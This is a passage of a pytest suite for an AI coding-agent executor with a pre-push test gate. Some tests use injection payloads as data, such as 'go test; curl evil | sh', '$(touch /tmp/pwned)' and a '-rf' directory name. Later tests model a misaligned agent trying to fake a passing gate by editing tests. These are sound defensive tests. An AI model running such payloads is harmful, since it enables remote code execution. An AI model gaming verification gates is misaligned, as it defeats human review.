    _make_fake_bin(
        bindir,
        opencode_stdout=stdout,
        opencode_rc=0,
        make_change=True,
        push_rc=0,
        pr_rc=0,
        seed_test_command="pytest",
        seed_requires_python=">3.11",
        record_uv_calls=True,
        test_rc=0,
        test_output="1 passed\n",
    )
    manifest_path = tmp_path / "mac-evidence.json"
    result = _run_build(
        bindir=bindir,
        manifest_path=manifest_path,
        task_id="task_pygt_" + uuid.uuid4().hex,
    )

    assert result.returncode == 0, "stdout=%s stderr=%s" % (
        result.stdout, result.stderr,
    )
    uv_calls = (bindir / "_uv_calls.txt").read_text(encoding="utf-8")
    # Must NOT provision the strictly-excluded 3.11; must bump to 3.12.
    assert "--python 3.12" in uv_calls or "--python=3.12" in uv_calls
    assert "--python 3.11" not in uv_calls
    assert "--python=3.11" not in uv_calls


def test_activate_python_rebuilds_venv_on_version_mismatch(tmp_path: Path) -> None:
    """gate-venv-staleness-01: a cached per-task venv built for Python A must
    be REBUILT when the project later declares Python B — not silently reused
    against the stale interpreter. _activate_python_for records the resolved
    version in `${venv_path}/.mac-python-version` and rebuilds on mismatch."""
    # Fake `uv`: `uv venv --python X <path>` creates the venv dir (with a
    # bin/python stub) and logs the requested version. Lets us assert how
    # many times — and for which versions — uv was invoked.
    fakebin = tmp_path / "fakebin"
    fakebin.mkdir()
    uv_calls = tmp_path / "uv_calls.txt"
    _write_exec(
        fakebin / "uv",
        "#!/usr/bin/env bash\n"
        f'echo "$@" >> "{uv_calls}"\n'
        'if [ "$1" = "venv" ]; then\n'
        '  ver=""; path=""\n'
        '  while [ $# -gt 0 ]; do\n'
        '    case "$1" in\n'
        '      --python) ver="$2"; shift 2 ;;\n'
        '      --python=*) ver="${1#--python=}"; shift ;;\n'
        '      venv) shift ;;\n'
        '      *) path="$1"; shift ;;\n'
        '    esac\n'
        '  done\n'
        '  mkdir -p "$path/bin"\n'
        '  printf "#!/bin/sh\\necho Python %s\\n" "$ver" > "$path/bin/python"\n'
        '  chmod +x "$path/bin/python"\n'
        '  exit 0\n'
        'fi\n'
        'exit 0\n',
    )
    proj = tmp_path / "proj"
    proj.mkdir()
    task_id = "venvstale_" + uuid.uuid4().hex
    venv_path = Path("/tmp") / ("mac-task-venv-" + task_id)
    # Ensure a clean slate (the per-task venv path persists across runs).
    shutil.rmtree(venv_path, ignore_errors=True)
    env = {
        "PATH": "%s%s%s" % (fakebin, os.pathsep, os.environ.get("PATH", "")),
        "MAC_TASK_ID": task_id,
    }
    try:
        # First run: project declares 3.11 -> uv builds a 3.11 venv.
        (proj / "pyproject.toml").write_text('[project]\nrequires-python = "==3.11"\n')
        r1 = _run_helper(
            ["_resolve_python_version", "_activate_python_for"],
            f'_activate_python_for "{proj}"',
            cwd=tmp_path,
            env=env,
        )
        assert r1.returncode == 0, "stderr=%s" % r1.stderr
        assert (venv_path / ".mac-python-version").read_text().strip() == "3.11"

        # Second run, SAME task id (cached venv exists), but the project now
        # declares 3.12. The stale 3.11 venv must be torn down and rebuilt.
        (proj / "pyproject.toml").write_text('[project]\nrequires-python = "==3.12"\n')
        r2 = _run_helper(
            ["_resolve_python_version", "_activate_python_for"],
            f'_activate_python_for "{proj}"',
            cwd=tmp_path,
            env=env,
        )
        assert r2.returncode == 0, "stderr=%s" % r2.stderr
        assert (venv_path / ".mac-python-version").read_text().strip() == "3.12", (
            "stale venv was not rebuilt for the new declared version"
        )
        calls = uv_calls.read_text(encoding="utf-8")
        # uv must have been asked to build BOTH versions across the two runs.
        assert "--python 3.11" in calls and "--python 3.12" in calls, (
            "expected uv to build 3.11 then rebuild 3.12; calls=%r" % calls
        )

        # Third run with the SAME declared version must REUSE the venv (no new
        # uv build). Capture the call count before/after.
        before = uv_calls.read_text(encoding="utf-8").count("venv")
        r3 = _run_helper(
            ["_resolve_python_version", "_activate_python_for"],
            f'_activate_python_for "{proj}"',
            cwd=tmp_path,
            env=env,
        )
        assert r3.returncode == 0, "stderr=%s" % r3.stderr
        after = uv_calls.read_text(encoding="utf-8").count("venv")
        assert after == before, (
            "matching cached venv must be reused, not rebuilt; "
            "uv venv invocations went %d -> %d" % (before, after)
        )
    finally:
        shutil.rmtree(venv_path, ignore_errors=True)


def test_resolve_node_version_finds_root_project_github_workflow(
    tmp_path: Path,
) -> None:
    """A repo-ROOT JS project that declares its Node version only in its own
    .github/workflows/*.yml must be resolved. The previous implementation only
    searched the PARENT of the project dir (`${pdir}/../.github`), so a root
    project's own workflow file was never found."""
    proj = tmp_path / "repo"
    wf = proj / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text("jobs:\n  build:\n    steps:\n      - uses: setup-node\n        with:\n          node-version: 20\n")
    result = _run_helper(
        ["_resolve_node_version"],
        f'_resolve_node_version "{proj}"',
        cwd=tmp_path,
    )
    assert result.returncode == 0, "stderr=%s" % result.stderr
    assert result.stdout.strip() == "20", (
        "root-project .github workflow node-version not resolved; got %r"
        % result.stdout
    )


def test_resolve_node_version_finds_subdir_project_repo_root_workflow(
    tmp_path: Path,
) -> None:
    """A SUBDIR JS project (dashboard/) whose Node version lives in the repo
    root's .github/workflows must still resolve via the parent search — the H1
    fix must not regress the subdir case."""
    repo = tmp_path / "repo"
    wf = repo / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text("        with:\n          node-version: 22\n")
    proj = repo / "dashboard"
    proj.mkdir()
    result = _run_helper(
        ["_resolve_node_version"],
        f'_resolve_node_version "{proj}"',
        cwd=tmp_path,
    )
    assert result.returncode == 0, "stderr=%s" % result.stderr
    assert result.stdout.strip() == "22", (
        "subdir-project repo-root workflow node-version not resolved; got %r"
        % result.stdout
    )


def test_detect_rejects_subdir_with_leading_dash(tmp_path: Path) -> None:
    """A subdir JS project whose directory name starts with `-` must NOT be
    emitted as `cd <name>` — `cd` would parse it as an option (e.g. `cd -P`),
    running npm test in the wrong directory and bypassing the gate. The
    detector must reject it and fall through (here: no test command -> rc 1)."""
    repo = tmp_path / "repo"
    sub = repo / "-rf"
    sub.mkdir(parents=True)
    (sub / "package.json").write_text('{"scripts":{"test":"vitest"}}')
    (sub / "a.test.ts").write_text("")
    result = _run_helper(
        ["_with_timeout", "_pkg_has_test_script", "_dir_has_js_tests",
         "_find_subdir_js_project", "gate_detect_test_command"],
        f'gate_detect_test_command "{repo}"',
        cwd=tmp_path,
    )
    assert "cd -rf" not in result.stdout, (
        "leading-dash subdir emitted as cd option; stdout=%r" % result.stdout
    )
    # No other detector matches -> detection fails (rc 1, empty command).
    assert result.stdout.strip() == ""


def test_detect_emitted_subdir_command_quotes_path(tmp_path: Path) -> None:
    """The emitted subdir command must use `cd --` so a future regex regression
    (or an exotic-but-allowed path) cannot turn the path into a cd option."""
    repo = tmp_path / "repo"
    sub = repo / "dashboard"
    sub.mkdir(parents=True)
    (sub / "package.json").write_text('{"scripts":{"test":"vitest"}}')
    (sub / "a.test.ts").write_text("")
    result = _run_helper(
        ["_with_timeout", "_pkg_has_test_script", "_dir_has_js_tests",
         "_find_subdir_js_project", "gate_detect_test_command"],
        f'gate_detect_test_command "{repo}"',
        cwd=tmp_path,
    )
    assert result.returncode == 0, "stderr=%s" % result.stderr
    assert result.stdout.strip() == "cd -- dashboard && npm test", (
        "subdir command must be `cd -- <rel> && npm test`; got %r"
        % result.stdout
    )


def test_detect_readme_command_returns_first_match_no_sigpipe(
    tmp_path: Path,
) -> None:
    """README scan must return the FIRST matching test command even when many
    lines match — `grep -m1` (not `... | head -1`) avoids the pipefail SIGPIPE
    that could empty the captured command (M2)."""
    repo = tmp_path / "repo"
    repo.mkdir()
    # Many matching lines so a `head -1`-style SIGPIPE could empty the capture.
    # Use `make test` (no `[^\n]*` tail) to assert on a stable, full token.
    body = "\n".join(["make test"] * 500) + "\n"
    (repo / "README.md").write_text(body)
    result = _run_helper(
        ["_with_timeout", "_pkg_has_test_script", "_dir_has_js_tests",
         "_find_subdir_js_project", "gate_detect_test_command"],
        f'gate_detect_test_command "{repo}"',
        cwd=tmp_path,
    )
    assert result.returncode == 0, "stderr=%s" % result.stderr
    assert result.stdout.strip() == "make test", (
        "README scan did not return first match cleanly; stdout=%r"
        % result.stdout
    )


def test_detect_readme_command_rejects_shell_injection(tmp_path: Path) -> None:
    """gate-detect-cmd-rce-01: a README line carrying a chained shell command
    (`go test; curl evil | sh`) must NOT be captured as the test command. The
    captured string becomes GATE_TEST_COMMAND, later run as
    `bash -c "${GATE_TEST_COMMAND}"` — so a greedy `[^\\n]*` tail would smuggle
    `curl evil | sh` onto the runner (RCE). The bounded char-class regex +
    allowlist validation must drop the injection; detection falls through to
    'could not detect' (rc 1)."""
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "README.md").write_text("Run tests with: go test; curl evil | sh\n")
    result = _run_helper(
        ["_with_timeout", "_pkg_has_test_script", "_dir_has_js_tests",
         "_find_subdir_js_project", "gate_detect_test_command"],
        f'gate_detect_test_command "{repo}"',
        cwd=tmp_path,
    )
    out = result.stdout.strip()
    # The injection payload must never appear in the captured command.
    assert "curl" not in out and ";" not in out and "|" not in out, (
        "shell injection leaked into detected command; stdout=%r" % result.stdout
    )
    # `go test` (bare, no path) is below the accepted threshold, so detection
    # falls through entirely — the safe outcome (gate blocks: manual review).
    assert out == "", "expected no detected command; got %r" % result.stdout


def test_detect_readme_command_accepts_benign_args(tmp_path: Path) -> None:
    """The RCE hardening must NOT regress legitimate commands carrying paths
    and flags. `go test ./...` and `pytest -q tests/` are safe and must still
    be detected (only shell metacharacters are rejected)."""
    for body, expected in (
        ("Run: go test ./...\n", "go test ./..."),
        ("Run: pytest -q tests/\n", "pytest -q tests/"),
    ):
        repo = tmp_path / ("repo_" + str(abs(hash(body)) % 10000))
        repo.mkdir()
        (repo / "README.md").write_text(body)
        result = _run_helper(
            ["_with_timeout", "_pkg_has_test_script", "_dir_has_js_tests",
             "_find_subdir_js_project", "gate_detect_test_command"],
            f'gate_detect_test_command "{repo}"',
            cwd=tmp_path,
        )
        assert result.stdout.strip() == expected, (
            "benign command %r not detected; got %r (stderr=%s)"
            % (expected, result.stdout, result.stderr)
        )


def test_makefile_test_wraps_js_detects_npm_in_deep_subtarget(tmp_path: Path) -> None:
    """A Makefile whose `test:` target chains to a sub-target that invokes npm
    more than 20 lines below `test:` must still be detected as JS-wrapping. The
    fixed-window `grep -A20` missed this; once `^test:` exists the detector must
    consider the WHOLE Makefile for a JS toolchain invocation."""
    mk = tmp_path / "Makefile"
    lines = ["test: test-dashboard"]
    # 25 filler lines (other targets) before the npm-bearing recipe.
    for i in range(25):
        lines.append(f"noop{i}:\n\techo {i}")
    lines.append("test-dashboard:\n\tcd dashboard && npm test")
    mk.write_text("\n".join(lines) + "\n")
    result = _run_helper(
        ["_makefile_test_wraps_js"],
        f'_makefile_test_wraps_js "{mk}" && echo WRAPS || echo NO',
        cwd=tmp_path,
    )
    assert result.stdout.strip() == "WRAPS", (
        "deep npm sub-target not detected; stdout=%r stderr=%r"
        % (result.stdout, result.stderr)
    )


def test_makefile_test_wraps_js_false_when_no_js_and_no_test_target(
    tmp_path: Path,
) -> None:
    """A pure-Python Makefile (no JS toolchain anywhere) must NOT be flagged as
    JS-wrapping — guards against the whole-file scan over-matching."""
    mk = tmp_path / "Makefile"
    mk.write_text("test:\n\tuv run pytest\nlint:\n\truff check .\n")
    result = _run_helper(
        ["_makefile_test_wraps_js"],
        f'_makefile_test_wraps_js "{mk}" && echo WRAPS || echo NO',
        cwd=tmp_path,
    )
    assert result.stdout.strip() == "NO", (
        "pure-Python Makefile wrongly flagged as JS-wrapping; stdout=%r"
        % result.stdout
    )


def test_gate_prefers_subdir_js_over_makefile_when_both_present(tmp_path: Path) -> None:
    """Exact production shape: repo root has pyproject.toml + a Makefile
    whose `test:` target chains to sub-targets (test-service, test-plugin,
    test-dashboard) — npm only appears two levels deep. A subdir JS project
    (dashboard/package.json with a `test` script) also exists.

    The gate MUST prefer the explicit subdir JS project (cd dashboard && npm
    test) over the ambiguous root Makefile. Choosing `make test` causes
    rc=127 because node_modules is absent and _makefile_test_wraps_js cannot
    see npm two levels deep in sub-targets — the exact production failure."""
    bindir = tmp_path / "bin"
    stdout = json.dumps({"type": "step_finish", "reason": "stop"}) + "\n"
    _make_fake_bin(
        bindir,
        opencode_stdout=stdout,
        opencode_rc=0,
        make_change=True,
        push_rc=0,
        pr_rc=0,
        # Root has pyproject.toml (Python tooling) AND a Makefile with a
        # `test:` target that chains to sub-targets (npm is not on the
        # test: line itself — it's in test-dashboard sub-target).
        seed_test_command="pytest",
        seed_makefile_wraps_npm=False,   # Makefile test: does NOT directly mention npm
        # Subdir JS project with explicit test script.
        seed_subdir_js="dashboard",
        test_rc=0,
        test_output="Test Files  1 passed\nTests  107 passed\n",
    )
    # Also seed a root Makefile that chains to sub-targets (no direct npm).
    # The fake opencode seeds it via the seed_test_command="pytest" path
    # which creates pyproject.toml; we add the Makefile via extra seeding.
    # Re-create bindir opencode to also seed the chained Makefile.
    _write_exec(
        bindir / "opencode",
        "#!/usr/bin/env bash\n"
        'if [ "$1" = "--version" ]; then echo "opencode 1.2.3"; exit 0; fi\n'
        'if [ "$1" = "run" ]; then\n'
        # seed pyproject.toml (Python tooling)
        '  printf "[project]\\nname = \\"x\\"\\n" > pyproject.toml\n'
        # seed Makefile with chained sub-targets (npm is in sub-target, not on test: line)
        '  printf "test: test-service test-dashboard\\ntest-service:\\n\\tuv run pytest\\ntest-dashboard:\\n\\tcd dashboard && npm test\\n" > Makefile\n'
        # seed dashboard/package.json with test script + deep test file
        '  mkdir -p dashboard/src/features/fitness\n'
        '  printf \'{"scripts":{"test":"vitest run"}}\' > dashboard/package.json\n'
        '  printf "" > dashboard/src/features/fitness/FitnessPage.test.tsx\n'
        f'  cat "{bindir / "_opencode_stdout.txt"}"\n'
        f'  cat "{bindir / "_opencode_stderr.txt"}" >&2\n'
        '  exit 0\n'
        "fi\n"
        "exit 0\n",
    )
    manifest_path = tmp_path / "mac-evidence.json"
    result = _run_build(bindir=bindir, manifest_path=manifest_path)

    assert result.returncode == 0, (
        "subdir JS project must win over chained-Makefile; stdout=%s stderr=%s"
        % (result.stdout, result.stderr)
    )
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["gate_verdict"] == "pass"
    assert manifest["gate_blocked"] is False
    items = _evidence_items(manifest)
    assert items[2]["label"] == "Tests"
    assert items[2]["status"] == "pass"
    # Must have chosen npm test in dashboard subdir, NOT make test.
    assert "npm test" in items[2]["command"]
    assert "make" not in items[2]["command"]
    repo = _findings_by_kind(manifest)["repo_change_summary"]
    assert repo["pushed"] is True


def test_gate_evidence_items_always_present_on_success(tmp_path: Path) -> None:
    """A passing coding task must always carry Lint/Format + Tests + Push +
    MR evidence items, and lint auto-fix must be attempted/recorded."""
    bindir = tmp_path / "bin"
    stdout = json.dumps({"type": "step_finish", "reason": "stop"}) + "\n"
    _make_fake_bin(
        bindir,
        opencode_stdout=stdout,
        opencode_rc=0,
        make_change=True,
        push_rc=0,
        pr_rc=0,
        seed_test_command="pytest",
        test_rc=0,
        seed_lint=True,
        lint_rc=0,
    )
    manifest_path = tmp_path / "mac-evidence.json"
    result = _run_build(bindir=bindir, manifest_path=manifest_path)

    assert result.returncode == 0, "stdout=%s" % result.stdout
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["gate_verdict"] == "pass"
    assert manifest["gate_blocked"] is False

    items = _evidence_items(manifest)
    # 1 Lint/Format, 2 Tests, 3 Push, 4 MR.
    assert items[1]["label"] == "Lint/Format"
    assert items[1]["command"] == "ruff check ."
    assert items[1]["status"] == "pass"
    assert items[2]["label"] == "Tests"
    assert items[2]["status"] == "pass"
    assert items[2]["command"] == "pytest"
    assert items[3]["label"] == "Push"
    assert items[3]["branch"]
    assert items[3]["commit_sha"]
    assert items[4]["label"] == "MR"
    assert items[4]["mr_url"] == "https://example.test/mr/1"

    # The gate check is recorded for reviewers.
    checks = {c["name"]: c for c in manifest["checks"]}
    assert checks["pre_push_test_gate"]["status"] == "pass"
    assert checks["lint_format"]["status"] == "pass"


def test_gate_lint_autofix_attempted_on_failure_but_does_not_block(
    tmp_path: Path,
) -> None:
    """Lint failures must trigger an auto-fix attempt and be recorded, but
    must NOT block the gate — tests are the hard gate."""
    bindir = tmp_path / "bin"
    stdout = json.dumps({"type": "step_finish", "reason": "stop"}) + "\n"
    _make_fake_bin(
        bindir,
        opencode_stdout=stdout,
        opencode_rc=0,
        make_change=True,
        push_rc=0,
        pr_rc=0,
        seed_test_command="pytest",
        test_rc=0,
        seed_lint=True,
        lint_rc=1,  # lint fails -> auto-fix attempted
    )
    manifest_path = tmp_path / "mac-evidence.json"
    result = _run_build(bindir=bindir, manifest_path=manifest_path)

    # Lint failure does NOT block: tests pass, so push proceeds.
    assert result.returncode == 0, "stdout=%s" % result.stdout
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    items = _evidence_items(manifest)
    assert items[1]["label"] == "Lint/Format"
    assert items[1]["auto_fixed"] is True  # --fix was attempted
    repo = _findings_by_kind(manifest)["repo_change_summary"]
    assert repo["pushed"] is True


def test_signed_manifest_with_rich_findings_passes_review_gate(
    tmp_path: Path,
) -> None:
    """The enriched manifest (head/tail slices, event summary, etc.) must
    still sign + verify under the attestation key and pass the review
    readiness gate. Guards canonical-JSON drift between the bash
    json.dump heredoc and mac.models.json_dumps for the larger payload."""
    cp = ControlPlane.in_memory()
    machine = cp.register_machine(
        "opencode-host", resources={"cpu": 4, "memory_gb": 8}
    )
    worker = cp.register_agent(
        machine.id, "mac-worker-python-coder-opencode", capabilities=["python", "ops"]
    )
    attestation_key = getattr(worker, "attestation_key", None)
    assert attestation_key

    task = cp.create_task(
        "Build a widget", required_capabilities=["ops"], metadata={}
    )
    cp.claim_task(task.id, worker.id)
    cp.start_task(task.id, worker.id)

    bindir = tmp_path / "bin"
    lines = [json.dumps({"type": "tool", "name": "edit"}) for _ in range(10)]
    lines.append(json.dumps({"type": "step_finish", "reason": "stop"}))
    stdout = "\n".join(lines) + "\n"
    _make_fake_bin(
        bindir,
        opencode_stdout=stdout,
        opencode_stderr="some stderr noise\n",
        opencode_rc=0,
        make_change=True,
        push_rc=0,
        pr_rc=0,
    )
    manifest_path = tmp_path / "mac-evidence.json"
    result = _run_build(
        bindir=bindir,
        manifest_path=manifest_path,
        task_id=task.id,
        agent_id=worker.id,
        extra_env={"MAC_AGENT_ATTESTATION_KEY": attestation_key},
    )
    assert result.returncode == 0, (
        "stdout=%s stderr=%s" % (result.stdout, result.stderr)
    )
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["signed_by"] == worker.id
    assert manifest["signature"].startswith("v1:")

    from mac.services import verify_verification_manifest_signature

    assert verify_verification_manifest_signature(
        attestation_key, manifest, manifest["signature"]
    ), "bash canonical form must agree with json_dumps for rich manifest"

    from mac.models import TaskState

    cp.add_evidence(
        task.id,
        "log",
        "artifact://operator-result",
        "executor produced operator_result manifest",
        worker.id,
        metadata={"returncode": 0, "verification": manifest},
    )
    cp.submit_for_review(task.id, worker.id)
    assert cp.get_task(task.id).state == TaskState.NEEDS_REVIEW.value


# --- Fix #1: capture work the agent committed to its own branch ---------


def _git(args: List[str], cwd: Path, env: Optional[Dict[str, str]] = None) -> str:
    full_env = dict(os.environ)
    full_env.update(
        {
            "GIT_AUTHOR_NAME": "t",
            "GIT_AUTHOR_EMAIL": "t@t",
            "GIT_COMMITTER_NAME": "t",
            "GIT_COMMITTER_EMAIL": "t@t",
        }
    )
    if env:
        full_env.update(env)
    return subprocess.run(
        ["git", *args],
        cwd=str(cwd),
        env=full_env,
        capture_output=True,
        text=True,
        check=True,
    ).stdout


@pytest.mark.skipif(
    shutil.which("git") is None, reason="git required for real-clone test"
)
def test_agent_committed_branch_is_pushed_to_task_branch(tmp_path: Path) -> None:
    """The real production failure: an agentic model uses its bash tool to
    `git checkout -b <its-own-branch>` + commit, leaving the working tree
    clean on a branch the script never inspects. The executor must detect
    that branch and push its work to the task branch on origin, instead of
    declaring 'no file changes'."""
    # Real bare remote + a seed commit on main.
    remote = tmp_path / "remote.git"
    _git(["init", "--bare", "-b", "main", str(remote)], cwd=tmp_path)
    seed = tmp_path / "seed"
    seed.mkdir()
    _git(["init", "-b", "main", str(seed)], cwd=tmp_path)
    (seed / "a.txt").write_text("original\n")
    # A pyproject so the pre-push gate detects `pytest` as the test command.
    (seed / "pyproject.toml").write_text('[project]\nname = "x"\n')
    _git(["add", "-A"], cwd=seed)
    _git(["commit", "-m", "seed"], cwd=seed)
    _git(["remote", "add", "origin", str(remote)], cwd=seed)
    _git(["push", "origin", "main"], cwd=seed)

    repo_url = "file://%s" % remote
    bindir = tmp_path / "bin"
    bindir.mkdir(parents=True)

    # Fake pytest on PATH: the pre-push gate runs it before pushing; exit 0
    # so the gate passes and the agent-committed branch is pushed.
    _write_exec(
        bindir / "pytest",
        "#!/usr/bin/env bash\necho '1 passed'\nexit 0\n",
    )

    # fake opencode: act like the agent — checkout its OWN branch, edit a
    # file, commit. Leaves the script's checked-out branch + tree clean.
    _write_exec(
        bindir / "opencode",
        "#!/usr/bin/env bash\n"
        'if [ "$1" = "--version" ]; then echo "opencode test"; exit 0; fi\n'
        'if [ "$1" = "run" ]; then\n'
        "  git checkout -b feature/agent-branch >/dev/null 2>&1\n"
        '  printf "agent change\\n" >> a.txt\n'
        "  git add -A >/dev/null 2>&1\n"
        '  git -c user.name=agent -c user.email=a@a commit -m "agent work" >/dev/null 2>&1\n'
        '  echo \'{"type":"step_finish","part":{"reason":"stop"}}\'\n'
        "  exit 0\n"
        "fi\n"
        "exit 0\n",
    )

    task_json = json.dumps(
        {
            "task": {
                "title": "Edit a.txt",
                "description": "append a line",
                "project": "demo",
                "metadata": {
                    "origin": {
                        "repository_url": repo_url,
                        "default_branch": "main",
                    }
                },
            }
        }
    )
    _write_exec(
        bindir / "curl",
        "#!/usr/bin/env bash\n"
        'url="${@: -1}"\n'
        'case "$url" in\n'
        f'  *"/tasks/"*) cat <<\'JSON\'\n{task_json}\nJSON\n;;\n'
        "  *) : ;;\n"
        "esac\n"
        "exit 0\n",
    )
    _write_exec(
        bindir / "mac",
        "#!/usr/bin/env bash\n"
        'if [ "$1" = "pull-request" ] && [ "$2" = "open" ]; then\n'
        '  echo \'{"url":"https://example.test/mr/1","number":1}\'\n'
        "  exit 0\n"
        "fi\n"
        "exit 0\n",
    )

    task_id = "task_agentbranch"
    manifest_path = tmp_path / "mac-evidence.json"
    # NOTE: do NOT shadow the real `git` — the script must use real git so
    # the clone/checkout/branch-detection/push all run for real. Only
    # opencode/curl/mac are faked.
    result = _run_build(
        bindir=bindir,
        manifest_path=manifest_path,
        task_id=task_id,
    )
    assert manifest_path.exists(), (
        "manifest missing; stdout=%s stderr=%s" % (result.stdout, result.stderr)
    )
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    findings = _findings_by_kind(manifest)
    repo = findings["repo_change_summary"]

    expected_branch = "mac/mac-worker-python-coder-opencode/%s" % task_id
    assert repo["pushed"] is True, (
        "agent-committed branch must be pushed; repo=%s stdout=%s"
        % (repo, result.stdout)
    )
    assert manifest["returncode"] == 0, (
        "run with real agent work must succeed; stdout=%s" % result.stdout
    )
    # The work must actually exist on the task branch in the REMOTE.
    remote_branches = _git(["branch", "--format=%(refname:short)"], cwd=remote)
    assert expected_branch in remote_branches.split(), (
        "task branch missing on remote; have=%r" % remote_branches
    )
    # And it must contain the agent's change.
    show = _git(["show", "%s:a.txt" % expected_branch], cwd=remote)
    assert "agent change" in show, "agent's commit not on the pushed branch"


def test_review_feedback_is_included_in_prompt_with_shell_safety(tmp_path: Path) -> None:
    bindir = tmp_path / "bin"
    captured = bindir / "_opencode_args.txt"
    _make_fake_bin(
        bindir,
        opencode_stdout=json.dumps({"type": "step_finish", "part": {"reason": "stop"}}) + "\n",
        make_change=False,
        task_metadata={
            "review_feedback": {
                "latest": {
                    "review_id": "rev_1",
                    "verdict_evidence_id": "ev_v",
                    "summary": "Needs fix",
                    "feedback": "Do not execute $(touch /tmp/pwned); fix tests",
                    "findings": [{"severity": "blocking", "message": "bad `command`; use quotes"}],
                }
            }
        },
    )
    # Override fake opencode to capture the prompt argument exactly.
    _write_exec(
        bindir / "opencode",
        "#!/usr/bin/env bash\n"
        'if [ "$1" = "--version" ]; then echo "opencode 1.2.3"; exit 0; fi\n'
        f'printf "%s\\n" "$@" > {captured}\n'
        "printf '%s\\n' '{\"type\":\"step_finish\",\"part\":{\"reason\":\"stop\"}}'\n"
        "exit 0\n",
    )
    manifest_path = tmp_path / "mac-evidence.json"
    result = _run_build(bindir=bindir, manifest_path=manifest_path)

    assert result.returncode != 127
    prompt = captured.read_text(encoding="utf-8")
    assert "Previous review feedback" in prompt
    assert "Do not execute $(touch /tmp/pwned); fix tests" in prompt
    assert not Path("/tmp/pwned").exists()


def test_gate_agent_fallback_provisions_unknown_stack_then_gate_judges(
    tmp_path: Path,
) -> None:
    """For a stack the registry does not handle (cargo), the gate invokes
    the agent ONLY to provision (PROVISION-ONLY prompt). The gate then
    re-runs the project's own `cargo test` and judges the exit code itself.
    The agent's provisioning enables a pass; it never reports the verdict."""
    bindir = tmp_path / "bin"
    _make_fake_bin(
        bindir,
        opencode_stdout=json.dumps({"type": "step_finish", "reason": "stop"}) + "\n",
        opencode_rc=0,
        make_change=True,
        push_rc=0,
        pr_rc=0,
        seed_test_command=None,          # no pyproject/package.json
        seed_unknown_test_cmd="cargo test",
    )
    # Override opencode: the build-phase `run` seeds the README that
    # declares `cargo test` (so the gate detects the unknown stack), and is
    # otherwise a no-op. The PROVISION-ONLY fallback invocation creates the
    # marker that lets cargo test pass. We seed the README unconditionally
    # on every `run` because the build-phase run is the one that populates
    # the working tree (this override replaces the default seed_block-bearing
    # opencode, so seeding must live here).
    _write_exec(
        bindir / "opencode",
        "#!/usr/bin/env bash\n"
        'if [ "$1" = "--version" ]; then echo "opencode 1.2.3"; exit 0; fi\n'
        'if [ "$1" = "run" ]; then\n'
        '  printf "Run tests with: cargo test\\n" > README.md\n'
        '  prompt="$*"\n'
        '  case "$prompt" in\n'
        '    *PROVISION-ONLY*) touch .mac-provisioned ;;\n'
        '  esac\n'
        "  echo '{\"type\":\"step_finish\",\"part\":{\"reason\":\"stop\"}}'\n"
        "  exit 0\n"
        "fi\n"
        "exit 0\n",
    )
    manifest_path = tmp_path / "mac-evidence.json"
    # Fallback is opt-in (review #2) — enable it explicitly.
    result = _run_build(
        bindir=bindir,
        manifest_path=manifest_path,
        extra_env={"MAC_GATE_AGENT_PROVISION_ENABLED": "1"},
    )

    assert result.returncode == 0, "stdout=%s stderr=%s" % (
        result.stdout, result.stderr,
    )
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["gate_verdict"] == "pass"
    items = _evidence_items(manifest)
    assert items[2]["label"] == "Tests"
    assert items[2]["status"] == "pass"
    assert "cargo test" in items[2]["command"]


def test_gate_agent_fallback_cannot_fake_a_pass(tmp_path: Path) -> None:
    """If the PROVISION-ONLY agent does NOT actually make the command
    runnable, the gate's own re-run of `cargo test` still fails and the
    push/MR are blocked. The agent cannot manufacture a green verdict."""
    bindir = tmp_path / "bin"
    _make_fake_bin(
        bindir,
        opencode_stdout=json.dumps({"type": "step_finish", "reason": "stop"}) + "\n",
        opencode_rc=0,
        make_change=True,
        push_rc=0,
        pr_rc=0,
        seed_test_command=None,
        seed_unknown_test_cmd="cargo test",
    )
    # Override opencode: a USELESS provisioning agent that claims success
    # but creates no marker — cargo test must still fail rc=127. The
    # build-phase run still seeds the README declaring the unknown stack so
    # the gate detects `cargo test`, but no .mac-provisioned marker is ever
    # created (so cargo test stays at rc=127).
    _write_exec(
        bindir / "opencode",
        "#!/usr/bin/env bash\n"
        'if [ "$1" = "--version" ]; then echo "opencode 1.2.3"; exit 0; fi\n'
        'if [ "$1" = "run" ]; then\n'
        '  printf "Run tests with: cargo test\\n" > README.md\n'
        "  echo '{\"type\":\"step_finish\",\"part\":{\"reason\":\"stop\"}}'\n"
        "  exit 0\n"
        "fi\n"
        "exit 0\n",
    )
    manifest_path = tmp_path / "mac-evidence.json"
    # Agent fallback is opt-in (review #2): enable it explicitly for this test.
    result = _run_build(
        bindir=bindir,
        manifest_path=manifest_path,
        extra_env={"MAC_GATE_AGENT_PROVISION_ENABLED": "1"},
    )

    # Real command still fails -> gate blocks. Agent cannot fake green.
    assert result.returncode != 0
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["gate_blocked"] is True
    assert manifest["gate_verdict"] == "fail"
    repo = _findings_by_kind(manifest)["repo_change_summary"]
    assert repo["pushed"] is False
    assert repo.get("pr_opened") is False


@pytest.mark.skipif(
    shutil.which("git") is None, reason="git required for reset-hard guard test"
)
def test_gate_provision_agent_test_edits_are_reverted(tmp_path: Path) -> None:
    """A malicious/misaligned PROVISION-ONLY agent edits a tracked test file
    to force `cargo test` green. The source-edit guard (git reset --hard to
    the pre-provision HEAD) MUST revert that edit, so the gate's own re-run
    of the REAL command still fails and the push is blocked. Proves the
    agent cannot manufacture a pass via filesystem side effects."""
    # Real bare remote + seed commit carrying a tracked test marker file and
    # a README declaring `cargo test`.
    remote = tmp_path / "remote.git"
    _git(["init", "--bare", "-b", "main", str(remote)], cwd=tmp_path)
    seed = tmp_path / "seed"
    seed.mkdir()
    _git(["init", "-b", "main", str(seed)], cwd=tmp_path)
    (seed / "README.md").write_text("Run tests with: cargo test\n")
    # A tracked file whose contents decide pass/fail.
    (seed / "gate_marker").write_text("FAIL\n")
    _git(["add", "-A"], cwd=seed)
    _git(["commit", "-m", "seed"], cwd=seed)
